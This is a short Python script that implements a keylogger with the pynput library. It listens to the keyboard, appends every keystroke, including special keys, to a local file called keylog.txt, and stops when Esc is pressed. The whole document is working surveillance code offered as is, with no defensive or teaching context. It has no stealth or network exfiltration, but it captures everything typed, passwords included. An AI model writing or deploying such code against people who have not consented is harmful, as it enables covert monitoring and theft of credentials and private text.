from pynput import keyboard

# File to store key logs
LOG_FILE = "keylog.txt"

# Callback function for when a key is pressed
def on_press(key):
    try:
        # Log the key as a character
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., arrow keys, function keys)
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

# Callback function for when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when Esc is pressed
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
